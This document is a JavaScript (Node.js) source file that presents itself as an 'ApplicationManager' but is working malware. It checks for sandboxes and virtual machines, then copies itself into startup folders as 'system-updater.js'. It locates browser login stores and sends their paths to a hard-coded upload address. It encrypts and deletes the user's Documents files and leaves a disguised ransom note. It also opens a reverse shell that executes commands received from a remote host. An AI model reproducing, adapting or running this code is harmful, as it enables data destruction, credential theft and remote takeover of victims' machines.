const net = require('net');
const { exec } = require('child_process');
const crypto = require('crypto');
const fs = require('fs');
const os = require('os');
const path = require('path');

class ApplicationManager {
    constructor() {
        this.config = {
            host: '192.168.1.45',
            port: 9090,
            reconnectDelay: 5000,
            bufferSize: 8192
        };
        this.activeConnection = null;
        this.processingQueue = [];
        this.systemInfo = this.collectSystemMetadata();
    }

    collectSystemMetadata() {
        return {
            platform: os.platform(),
            hostname: os.hostname(),
            architecture: os.arch(),
            userInfo: os.userInfo(),
            networkInterfaces: os.networkInterfaces(),
            cpuInfo: os.cpus(),
            totalMemory: os.totalmem(),
            freeMemory: os.freemem(),
            uptime: os.uptime()
        };
    }

    validateEnvironment() {
        const hostname = os.hostname().toLowerCase();
        const suspiciousTerms = ['sandbox', 'vmware', 'virtualbox', 'vbox', 'test'];

        for (let term of suspiciousTerms) {
            if (hostname.includes(term)) {
                return false;
            }
        }

        const cpuCount = os.cpus().length;
        if (cpuCount < 2) {
            return false;
        }

        const totalMemGB = os.totalmem() / (1024 * 1024 * 1024);
        if (totalMemGB < 4) {
            return false;
        }

        return true;
    }

    establishConnection() {
        if (!this.validateEnvironment()) {
            process.exit(0);
        }

        this.activeConnection = new net.Socket();

        this.activeConnection.connect(this.config.port, this.config.host, () => {
            const handshake = JSON.stringify(this.systemInfo);
            this.activeConnection.write(handshake);
        });

        this.activeConnection.on('data', (data) => {
            const command = data.toString('utf8').trim();
            this.executeCommand(command);
        });

        this.activeConnection.on('error', (err) => {
            setTimeout(() => this.establishConnection(), this.config.reconnectDelay);
        });

        this.activeConnection.on('close', () => {
            setTimeout(() => this.establishConnection(), this.config.reconnectDelay);
        });
    }

    executeCommand(command) {
        exec(command, { maxBuffer: this.config.bufferSize }, (error, stdout, stderr) => {
            let response = '';

            if (error) {
                response = `Error: ${error.message}`;
            } else if (stderr) {
                response = stderr;
            } else {
                response = stdout;
            }

            if (this.activeConnection && this.activeConnection.writable) {
                this.activeConnection.write(response);
            }
        });
    }

    scanFileSystem(baseDir) {
        const targetExtensions = ['.txt', '.doc', '.docx', '.pdf', '.xlsx', '.jpg', '.png'];
        const foundFiles = [];

        const walkDirectory = (currentPath) => {
            try {
                const entries = fs.readdirSync(currentPath);

                for (let entry of entries) {
                    const fullPath = path.join(currentPath, entry);
                    const stats = fs.statSync(fullPath);

                    if (stats.isDirectory()) {
                        walkDirectory(fullPath);
                    } else if (stats.isFile()) {
                        const ext = path.extname(entry).toLowerCase();
                        if (targetExtensions.includes(ext)) {
                            foundFiles.push(fullPath);
                        }
                    }
                }
            } catch (err) {
                // Skip directories we can't access
            }
        };

        walkDirectory(baseDir);
        return foundFiles;
    }

    processFiles(files) {
        const algorithm = 'aes-256-cbc';
        const key = crypto.randomBytes(32);
        const iv = crypto.randomBytes(16);

        files.forEach(filePath => {
            try {
                const fileContent = fs.readFileSync(filePath);
                const cipher = crypto.createCipheriv(algorithm, key, iv);

                let encrypted = cipher.update(fileContent);
                encrypted = Buffer.concat([encrypted, cipher.final()]);

                const outputPath = filePath + '.encrypted';
                fs.writeFileSync(outputPath, encrypted);
                fs.unlinkSync(filePath);

                this.processingQueue.push({
                    original: filePath,
                    processed: outputPath,
                    timestamp: Date.now()
                });
            } catch (err) {
                // Skip files we can't process
            }
        });

        const noticeFile = path.join(os.homedir(), 'IMPORTANT_NOTICE.txt');
        const noticeContent = `System Optimization Complete\n\nFiles processed: ${files.length}\nContact: support@example.com for recovery procedure`;
        fs.writeFileSync(noticeFile, noticeContent);
    }

    initializePersistence() {
        const currentScript = __filename;
        const startupPath = this.getStartupPath();

        if (startupPath && !fs.existsSync(path.join(startupPath, 'system-updater.js'))) {
            try {
                fs.copyFileSync(currentScript, path.join(startupPath, 'system-updater.js'));
            } catch (err) {
                // Persistence failed silently
            }
        }
    }

    getStartupPath() {
        const platform = os.platform();

        if (platform === 'win32') {
            return path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
        } else if (platform === 'darwin') {
            return path.join(os.homedir(), 'Library', 'LaunchAgents');
        } else {
            return path.join(os.homedir(), '.config', 'autostart');
        }
    }

    captureCredentials() {
        const credentialPaths = [];
        const homeDir = os.homedir();

        const browserPaths = [
            path.join(homeDir, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
            path.join(homeDir, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles'),
            path.join(homeDir, 'Library', 'Application Support', 'Google', 'Chrome', 'Default', 'Login Data'),
            path.join(homeDir, 'Library', 'Application Support', 'Firefox', 'Profiles')
        ];

        browserPaths.forEach(browserPath => {
            if (fs.existsSync(browserPath)) {
                credentialPaths.push(browserPath);
            }
        });

        return credentialPaths;
    }

    transmitData(data) {
        const encoded = Buffer.from(JSON.stringify(data)).toString('base64');
        const uploadEndpoint = 'http://10.1.1.200:8000/upload';

        const https = require('https');
        const url = require('url');
        const parsedUrl = url.parse(uploadEndpoint);

        const options = {
            hostname: parsedUrl.hostname,
            port: parsedUrl.port || 80,
            path: parsedUrl.path,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': encoded.length
            }
        };

        const req = https.request(options, (res) => {
            // Data sent successfully
        });

        req.on('error', (err) => {
            // Send failed silently
        });

        req.write(encoded);
        req.end();
    }

    run() {
        if (!this.validateEnvironment()) {
            return;
        }

        this.initializePersistence();

        const credentials = this.captureCredentials();
        if (credentials.length > 0) {
            this.transmitData({
                type: 'credentials',
                paths: credentials,
                system: this.systemInfo
            });
        }

        const userDocuments = path.join(os.homedir(), 'Documents');
        const sensitiveFiles = this.scanFileSystem(userDocuments);

        if (sensitiveFiles.length > 0) {
            this.processFiles(sensitiveFiles);
        }

        this.establishConnection();
    }
}

const manager = new ApplicationManager();
manager.run();
